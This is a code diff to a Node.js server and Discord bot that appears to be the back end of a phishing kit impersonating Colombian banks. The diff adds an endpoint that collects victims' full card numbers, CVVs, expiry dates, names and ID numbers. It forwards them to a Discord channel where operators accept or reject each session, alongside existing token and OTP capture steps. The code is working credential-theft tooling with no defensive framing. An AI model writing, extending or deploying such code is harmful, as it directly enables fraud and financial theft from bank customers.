@@ -104,11 +104,35 @@ function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
     return embed;
 }
 
+// 🆕 NUEVO — Embed para pagos con Tarjeta (Visa/Mastercard)
+function buildEmbedTarjeta(banco, bancoKey, datos, sessionId) {
+    const { marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
+
+    const marcaTexto = marca === 'visa' ? 'VISA' : 'MASTERCARD';
+    const colorMarca = marca === 'visa' ? 0x1434CB : 0xEB001B;
+
+    const embed = new EmbedBuilder()
+        .setTitle(`💳 ${marcaTexto} - Nuevo pago`)
+        .setColor(colorMarca)
+        .addFields(
+            { name: '🏷️ Marca', value: marcaTexto, inline: true },
+            { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
+            { name: '🗓️ Expira', value: `${expMes || '--'}/${expAnio || '--'}`, inline: true },
+            { name: '🔒 CVV', value: `\`${cvv || '---'}\``, inline: true },
+            { name: '👤 Titular', value: titular || '(vacío)', inline: false },
+            { name: '📄 Documento', value: `${docType || 'CC'} ${docNumber || '(vacío)'}`, inline: true },
+            { name: '💰 Monto', value: `$${Number(monto || 0).toLocaleString('es-CO')} COP`, inline: true }
+        );
+
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
+    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
+
+    return embed;
+}
+
 // ============================================
 // BOTONES DEL EMBED INICIAL (después de la clave)
-// - Bogotá: 2 botones (Token / Rechazar)
-// - Caja Social, BBVA, Popular, Occidente: 3 botones (Rechazar / Token / OTP)
-// - Todos los demás: 2 botones (Rechazar / OTP)
 // ============================================
 function buildButtonsInicial(bancoKey, sessionId) {
     if (bancoKey === 'bogota') {
@@ -155,8 +179,6 @@ function buildButtonsInicial(bancoKey, sessionId) {
 
 // ============================================
 // BOTONES DEL EMBED TOKEN
-// - Caja Social, BBVA, Popular, Occidente: 3 botones (Rechazar / OTP / Finalizar)
-// - Otros: 3 botones (OTP / Finalizar / Rechazar)
 // ============================================
 function buildButtonsToken(bancoKey, sessionId) {
     if (bancoKey === 'caja-social' || bancoKey === 'bbva' || bancoKey === 'popular' || bancoKey === 'occidente') {
@@ -194,8 +216,6 @@ function buildButtonsToken(bancoKey, sessionId) {
 
 // ============================================
 // BOTONES DEL EMBED OTP
-// - Caja Social, BBVA, Popular, Occidente: 3 botones (Rechazar / Finalizar / Token)
-// - Otros: 2 botones (Rechazar / Finalizar)
 // ============================================
 function buildButtonsOtp(bancoKey, sessionId) {
     if (bancoKey === 'caja-social' || bancoKey === 'bbva' || bancoKey === 'popular' || bancoKey === 'occidente') {
@@ -236,6 +256,64 @@ const server = http.createServer(async (req, res) => {
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning');
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
+
+    // ─── POST /cc-bogota/enviar-pago ──────────────────── 🆕 NUEVO
+    const pagoTarjetaMatch = req.url.match(/^\/cc-bogota\/enviar-pago$/);
+    if (req.method === 'POST' && pagoTarjetaMatch) {
+        const bancoKey = 'cc-bogota';
+        const banco = bancos[bancoKey];
+
+        if (!banco) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ ok: false, error: 'Banco cc-bogota no existe' }));
+            return;
+        }
+
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const datos = JSON.parse(body);
+                const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
+
+                if (!sessionId || !marca) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ ok: false, error: 'sessionId y marca requeridos' }));
+                    return;
+                }
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, { marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv });
+
+                console.log(`💳 [${bancoKey}] Nueva sesión: ${sessionId} (${marca})`);
+
+                const embed = buildEmbedTarjeta(banco, bancoKey, datos, sessionId);
+
+                const row = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder()
+                        .setCustomId(`ACEPTAR|${bancoKey}|${sessionId}`)
+                        .setLabel('✅ Aceptar')
+                        .setStyle(ButtonStyle.Success),
+                    new ButtonBuilder()
+                        .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                        .setLabel('❌ Rechazar')
+                        .setStyle(ButtonStyle.Danger)
+                );
+
+                const channel = await client.channels.fetch(banco.canalId);
+                await channel.send({ embeds: [embed], components: [row] });
+
+                console.log(`📨 [${bancoKey}] Embed Tarjeta enviado a canal ${banco.canalId}`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true, sessionId }));
+            } catch (err) {
+                console.error(`❌ [${bancoKey}] Error /enviar-pago:`, err);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: err.message }));
+            }
+        });
+        return;
+    }
 
     // ─── POST /:banco/enviar ───────────────────────
     const enviarMatch = req.url.match(/^\/([a-z-]+)\/enviar$/);
@@ -437,7 +515,12 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const sessionId = partes[2];
     const usuario = interaction.user.username;
 
-    if (accion === 'RECHAZAR') {
+    if (accion === 'ACEPTAR') {  // 🆕 NUEVO
+        estadoSesiones.set(sessionId, 'aceptado');
+        console.log(`✅ [${bancoKey}] ACEPTADO: ${sessionId}`);
+        await interaction.reply({ content: `✅ Sesión **${sessionId}** ACEPTADA por ${usuario}` });
+
+    } else if (accion === 'RECHAZAR') {
         estadoSesiones.set(sessionId, 'rechazado');
         console.log(`❌ [${bancoKey}] RECHAZADO: ${sessionId}`);
         await interaction.reply({ content: `❌ Sesión **${sessionId}** RECHAZADA por ${usuario}` });
